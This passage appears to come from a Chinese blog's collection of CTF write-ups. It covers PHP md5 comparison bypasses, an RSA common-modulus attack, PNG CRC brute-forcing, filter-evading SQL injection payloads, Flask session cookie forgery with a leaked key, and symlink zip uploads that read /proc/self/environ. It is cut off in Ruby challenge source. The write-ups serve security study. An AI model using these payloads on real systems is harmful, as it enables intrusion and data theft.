\"RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUPRSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA====\"hex = base64.b32decode(b32)print(hex)f1 = open(\"1.png\",'wb')f1.write(hex)f1.close() 然后拿到了如下一张图：后来得知是PDF417，然后到网上找了一下扫描的方法，这里和这里都可以识别，识别出了下面这个图：这里卡了好久，要不是就拿到了二血了…后来看到图片的标题F5得知是F5隐写，然后用F5-steganography跑出了flag。 这里偶然间发现了一个更好用的工具，输入morse码就直接出了PDF417的图，分享一下：CyberChef，只能说，师傅们tql!","link":"/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/"},{"title":"安恒-抗疫月赛","text":"抗疫抗疫！来自安全人员的行动！ Web-easy-hash考察md5强比较、弱比较以及md5碰撞，本题是掘安杯的audit题改的，参考getfly师傅的博客。 解题进入题目，给出了源码如下： &lt;?phphighlight_file(__FILE__);error_reporting(0);$val1 = @$_GET['val1'];$val2 = @$_GET['val2'];$val3 = @$_GET['val3'];$val4 = @$_GET['val4'];$val5 = (string)@$_POST['val5'];$val6 = (string)@$_POST['val6'];$val7 = (string)@$_POST['val7'];if( $val1 == $val2 ){ die('val1 OR val2 no no no');}if( md5($val1) != md5($val2) ){ die('step 1 fail');}if( $val3 == $val4 ){ die('val3 OR val4 no no no');}if ( md5($val3) !== md5($val4)){ die('step 2 fail');}if( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 ){ die('val5 OR val6 OR val7 no no no');}if (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7)){ die('step 3 fail');}if(!($_POST['a']) and !($_POST['b'])){ echo \"come on!\"; die();}$a = $_POST['a'];$b = $_POST['b'];$m = $_GET['m'];$n = $_GET['n'];if (!(ctype_alnum($a)) || (strlen($a) &gt; 5) || !(ctype_alnum($b)) || (strlen($b) &gt; 6)){ echo \"a OR b fail!\"; die();}if ((strlen($m) &gt; 1) || (strlen($n) &gt; 1)){ echo \"m OR n fail\"; die();}$val8 = md5($a);$val9 = strtr(md5($b), $m, $n);echo PHP_EOL;echo \"&lt;p&gt;val8 : $val8&lt;/p&gt;\";echo PHP_EOL;echo \"&lt;p&gt;val9 : $val9&lt;/p&gt;\";echo PHP_EOL;if (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 5)){ echo \"nice,good job,give you flag:\"; echo file_get_contents('/var/www/html/flag.php');} 分析代码可以看到，我们需要找到满足md5弱比较条件的val1和val2，这个网上有很多： 0e开头的md5和原值：QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 然后需要利用md5强比较绕过对val3和val4的判断，由于没有要求是字符串，因此利用数据进行绕过： val3[]=1&amp;val4[]=2 再往下看，对val5、val6和val7进行了(string)的限制，这里的判断是真正需要进行md5碰撞了，网上能找到很多数据有微小差别但是md5值相同的例子，但是都是两个一对的，但是本题有三个变量，需要借助这个工具来生成值不同但是md5相同的文件。 然后是对a、b、m和n的判断：ctype_alnum($a\\b)判断a\\b是否是字母和数字或字母数字的组合；同时要求m和n长度不能超过1。 然后令$val8 = md5($a)，$val9 = strtr(md5($b), $m, $n)将md($b)中与$m相同的值替换为$n的值。最后还需要满足($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 5)，这个地方利用md5弱碰撞就行，利用QNKCDZO/0e830400451993494058024219903391类的字符串，找一个长度为5且md5值以0e开头后面全是数字的字符串$a，另找一个0e开头后面为纯数字/一位字母的字符串$b，若0e后面是一个字母和其他的数字，利用strtr()函数将其md5值中字母改为数字即可。 难点就在于找满足要求的$a和$b的值了，这里参考getfly师傅的脚本来爆破： # 爆破数字+字母，找到符合md5后为0e开头，且后面为纯数字/一位字母的字符串import stringimport itertoolsimport hashlibdic = string.ascii_lowercase + string.ascii_uppercase + string.digitstime = 0for n in itertools.permutations(dic, 5): print('trying', time) time += 1 i = ''.join(n) li = [0] * 26 count = 0 strs = hashlib.md5(str(i).encode('utf-8')).hexdigest() if strs[:2] == '0e': for j in strs[2:]: if ord(j) &gt;= 97: li[ord(j)-97] += 1 for k in li: if k != 0: count += 1 if count &lt; 1: print(i) break 最后利用构造好的payload写脚本拿flag。 解题脚本import requestsurl = 'http://183.129.189.60:10004/?val1=QNKCDZO&amp;val2=s878926199a&amp;val3[]=1&amp;val4[]=2&amp;m=a&amp;n=1'file1 = open('out_test_000.txt', 'rb').read()file2 = open('out_test_001.txt', 'rb').read()file3 = open('out_test_002.txt', 'rb').read()data = {'val5':file1, 'val6':file2, 'val7':file3, 'a':'byGcY', 'b':'aOtm2'}s = requests.post(url, data)print(s.text) Crypto-古典密码进入题目，分别给了一组凯撒密码加密的字符串、一组morse码、一组栅栏密码加密的字符串，分别解密即可。 Crypto-RSA跟前两天Ichunqiu的抗疫赛中的一道RSA题一样，考察共模攻击 解题附件代码如下： from flag import flagfrom Crypto.Util.number import *p=getPrime(1024)q=getPrime(1024)e=65537n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,ne=11187289n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,n'''3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353 65537 215502791026440531374017943574509443026107313903012946787932507273960893580727006585712607959101122653095680142961222883845164478958272011115310543865300164329049899272167015075873664468026668483228537817299054927286554748325123815056279405558543083645781082659623880443631332464147537682295648462751543118983839938922932971224286619609462079509945608989640549131944621872428186332959700277410852011221557261307590459577578339426165440660550816007923664116919793507448949389949153288746002296844775332202404896001717469438491798036931220818883242589877791312231505899532489296799311421342081510430007932725208742059333466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710 11187289 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933''' 明显地看出是使用相同的模数n、两个不同的e生成了两个密文c，直接上POC： import sysimport binasciisys.setrecursionlimit(1000000)def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mn = 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933e1 = 65537e2 = 11187289c1 = 3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353c2 = 3466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m=(pow(c1,s1,n)*pow(c2,s2,n)) % nprint (binascii.unhexlify(hex(m)[2:].strip(\"L\"))) Misc-lemonEssence考察CRC爆破 解题下载压缩包解压出如下一张PNG图片：缩略图可以看，但是放大之后看不了，猜测是对其高或宽进行了更改，需要进行CRC爆破以获得原来的宽和高，修改回去就行了。利用Winrar拿到其CRC，然后利用下面的脚本爆破： import zlibimport structcrc32key = 0x986B9E93data = bytearray(b'\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\x69\\x00\\x00\\x01\\x25\\x08\\x02\\x00\\x00\\x00') #表示宽和高部分的字节(13-29bytes)n = 4095 #理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了for w in range(n): #高和宽一起爆破 width = bytearray(struct.pack('&gt;i', w)) #q为8字节，i为4字节，h为2字节 for h in range(n): height = bytearray(struct.pack('&gt;i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) exit(0) 把爆破出地结果与图片数据对比，发现高的部分被更改了，如图更改回去即可看到flag：","link":"/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/"},{"title":"SWPU2019复现","text":"一直想着复现来着，记事本里也记录了几个月了…🤣 Web1二次注入、无列名查询，对MariaDB过滤information_schema的注入。 题目分析进入题目注册并登陆之后，发现可以发布广告，并且在广告名的地方存在二次注入(提交内容的时候注入不执行，查询的时候才执行)，经过测试发现or被ban了，同时空格也会被替换为空，因此需要利用/**/绕过对空格的过滤。既然or被ban掉了，那么便不能再利用order by注入查列数了，此时只能直接利用union select进行列名的遍历了。在测试的过程中发现了后台数据库是MariaDB同时or被ban掉，因此information_schema不能用，此时想到利用mysql.innodb_table_stats来查表名(这个地方可以参考：https://mariadb.com/kb/en/mysqlinnodb_table_stats/)，但是无法获取列名，因此最终获取flag需要借助`无列名注入`了(参考：https://blog.csdn.net/chasingin/article/details/103476001)。 现在思路就很明确了，首先利用union select测试出列数，然后利用mysql.innodb_table_stats查出表名，最后无列名注入拿到flag。 解题首先查列数： -1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 利用mysql.innodb_table_stats查表名： -1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 将列转换为行，进行无列名注入： -1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 另外补充一点，如果后台数据库是mysql，但是information_schema被ban掉之后，如果mysql没有开启innodb存储引擎则可利用sys数据库``schema_auto_increment_columns和schema_table_statistics_with_buffer来绕过，但是本题后台数据库是MariaDB，上述方法便不可用，不过给一下我做题的时候测试的payload，遇到类似题目可能用得上： -1'union/**/select/**/1,(select/**/group_concat(table_name)from/**/sys.schema_auto_increment_column/**/where/**/table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22-1'union/**/select/**/1,(select/**/group_concat(table_name)from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 然后再利用join或join...using进行无列名查询即可。绕过information_schema可以参考：https://www.anquanke.com/post/id/193512 easy_python考察JWT伪造攻击，软链接任意文件读取 题目分析进入题目是一个登录框，任意用户名密码登录，发现可以进行文件上传： 直接点按钮反馈没有权限… 看源码发现了404 not found的提示，网上的wp是这么说的： 在flask中，可以使用app.errorhandler()装饰器来注册错误处理函数，参数是HTTP 错误状态码或者特定的异常类，由此我们可以联想到在404错误中会有东西存在。 那么我们构造一个任意的文件到url中去访问，看一下回显： 发现响应头中存在Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg== 解码得到：SECRET_KEY:keyqqqwwweee!@#$%^&amp;* 结合前面的权限要求，猜测是JWT伪造了，但是这个题中的JWT直接去解base64的结果是这样的：{&quot;id&quot;:{&quot; b&quot;:&quot;MTAw&quot;},&quot;is_login&quot;:true,&quot;password&quot;:&quot;123&quot;,&quot;username&quot;:&quot;123&quot;} 期初一直以这种结构去伪造，服务器就老是反馈500 error，后来参考网上一篇wp中讲的解JWT用的是如下的代码： \"\"\" Flask Session Cookie Decoder/Encoder \"\"\"__author__ = 'Wilson Sumanang, Alexandre ZANNI'# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0 raise Exception('Must be using at least Python 3')elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 from abc import ABCMeta, abstractmethodelse: # &gt; 3.4 from abc import ABC, abstractmethod# Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object): def __init__(self, secret_key): self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 class FSCM(metaclass=ABCMeta): def encode(secret_key, session_cookie_structure): \"\"\" Encode a Flask session cookie \"\"\" try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \"[Encoding error] {}\".format(e) raise e def decode(session_cookie_value, secret_key=None): \"\"\" Decode a Flask cookie \"\"\" try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith('.'): compressed = True payload = payload[1:] data = payload.split(\".\")[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return \"[Decoding error] {}\".format(e) raise eelse: # &gt; 3.4 class FSCM(ABC): def encode(secret_key, session_cookie_structure): \"\"\" Encode a Flask session cookie \"\"\" try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \"[Encoding error] {}\".format(e) raise e def decode(session_cookie_value, secret_key=None): \"\"\" Decode a Flask cookie \"\"\" try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith('.'): compressed = True payload = payload[1:] data = payload.split(\".\")[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return \"[Decoding error] {}\".format(e) raise eif __name__ == \"__main__\": # Args are only relevant for __main__ usage ## Description for help parser = argparse.ArgumentParser( description='Flask Session Cookie Decoder/Encoder', epilog=\"Author : Wilson Sumanang, Alexandre ZANNI\") ## prepare sub commands subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand') ## create the parser for the encode command parser_encode = subparsers.add_parser('encode', help='encode') parser_encode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;', help='Secret key', required=True) parser_encode.add_argument('-t', '--cookie-structure', metavar='&lt;string&gt;', help='Session cookie structure', required=True) ## create the parser for the decode command parser_decode = subparsers.add_parser('decode', help='decode') parser_decode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;', help='Secret key', required=False) parser_decode.add_argument('-c', '--cookie-value', metavar='&lt;string&gt;', help='Session cookie value', required=True) ## get args args = parser.parse_args() ## find the option chosen if(args.subcommand == 'encode'): if(args.secret_key is not None and args.cookie_structure is not None): print(FSCM.encode(args.secret_key, args.cookie_structure)) elif(args.subcommand == 'decode'): if(args.secret_key is not None and args.cookie_value is not None): print(FSCM.decode(args.cookie_value,args.secret_key)) elif(args.cookie_value is not None): print(FSCM.decode(args.cookie_value)) 用法如下： 解密:python flask_session_manager.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY加密:python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式 按照这个代码解JWT结果如下： python3 flask_session_manager.py decode -c \"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSqQQ.0VoijfPiLI6lwy9zvZ-yk5U5Lv8\" -s \"keyqqqwwweee!@#$%^&amp;*\"{'id': b'100', 'is_login': True, 'password': '123', 'username': '123'}这里就可以看出不一样了，现在还没搞懂原因... python3 flask_session_manager.py encode -s \"keyqqqwwweee!@#$%^&amp;*\" -t \"{'id': b'1', 'is_login': True, 'password': '123', 'username': '123'}\"eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TE这里我们伪造id:b'1'的用户session进行登录 利用伪造的session，成功登录： 查看源码如下： @app.route('/upload',methods=['GET','POST'])def upload(): if session['id'] != b'1': return render_template_string(temp) if request.method=='POST': m = hashlib.md5() name = session['password'] name = name+'qweqweqwe' name = name.encode(encoding='utf-8') m.update(name) md5_one= m.hexdigest() n = hashlib.md5() ip = request.remote_addr ip = ip.encode(encoding='utf-8') n.update(ip) md5_ip = n.hexdigest() f=request.files['file'] basepath=os.path.dirname(os.path.realpath(__file__)) path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+\"/\" path_base = basepath+'/upload/'+md5_ip+'/' filename = f.filename pathname = path+filename if \"zip\" != filename.split('.')[-1]: return 'zip only allowed' if not os.path.exists(path_base): try: os.makedirs(path_base) except Exception as e: return 'error' if not os.path.exists(path): try: os.makedirs(path) except Exception as e: return 'error' if not os.path.exists(pathname): try: f.save(pathname) except Exception as e: return 'error' try: cmd = \"unzip -n -d \"+path+\" \"+ pathname if cmd.find('|') != -1 or cmd.find(';') != -1: waf() return 'error' os.system(cmd) except Exception as e: return 'error' unzip_file = zipfile.ZipFile(pathname,'r') unzip_filename = unzip_file.namelist()[0] if session['is_login'] != True: return 'not login' try: if unzip_filename.find('/') != -1: shutil.rmtree(path_base) os.mkdir(path_base) return 'error' image = open(path+unzip_filename, \"rb\").read() resp = make_response(image) resp.headers['Content-Type'] = 'image/png' return resp except Exception as e: shutil.rmtree(path_base) os.mkdir(path_base) return 'error' return render_template('upload.html')@app.route('/showflag')def showflag(): if True == False: image = open(os.path.join('./flag/flag.jpg'), \"rb\").read() resp = make_response(image) resp.headers['Content-Type'] = 'image/png' return resp else: return \"can't give you\" 以正常逻辑来看，这里的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。这里我们可以上传一个软链接压缩包，来读取其他敏感文件而不是我们上传的文件。 结合 showflag()函数的源码，我们可以得知 flag.jpg 放在 flask 应用根目录的flag目录下。那么我们只要创建一个到/xxx/flask/flag/flag.jpg的软链接，即可读取 flag.jpg 文件。 两种方式构造： 1、在 linux 中，/proc/self/cwd/会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问 flag.jpg。 命令如下： ln -s /proc/self/cwd/flag/flag.jpg qwe zip -ry qwe.zip qwe 2、在 linux 中，/proc/self/environ文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到/proc/self/environ的内容，只需要下载到本地，用 notepad++打开即可) 命令如下： ln -s /proc/self/environ qqq zip -ry qqq.zip qqq ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www zip -ry [www.zip\\]\\(http://www.zip\\) www 解题在上一步中，我们已经成功拿到上传的权限了，现在到linux中生成读取flag的软连接，上传之后服务端回显如下： 因为是一个有问题的图片，无法显示，其实就是BUU改了，它本质上还是一个txt，下载下来即可拿到flag。 Flag Shop考察JWT伪造，ruby的ERB模板注入。后者是第一次接触 题目分析进入题目发现可以买flag，但是很贵，这个时候又可以进行work拿jkl，这点到啥时候去啊… 不过存在robots.txt，提示了filebake的存在： 访问fileback拿到源码： require 'sinatra'require 'sinatra/cookies'require 'sinatra/json'require 'jwt'require 'securerandom'require 'erb'set :public_folder, File.dirname(__FILE__) + '/static'FLAGPRICE = 1000000000000000000000000000ENV[\"SECRET\"] = SecureRandom.hex(64)configure do enable :logging file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\") file.sync = true use Rack::CommonLogger, fileendget \"/\" do redirect '/shop', 302endget \"/filebak\" do content_type :text erb IO.binread __FILE__endget \"/api/auth\" do payload = { uid: SecureRandom.uuid , jkl: 20} auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = authendget \"/api/info\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})endget \"/shop\" do erb :shopendget \"/work\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } auth = auth[0] unless params[:SECRET].nil? if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\") puts ENV[\"FLAG\"] end end if params[:do] == \"#{params[:name][0,7]} is working\" then auth[\"jkl\"] = 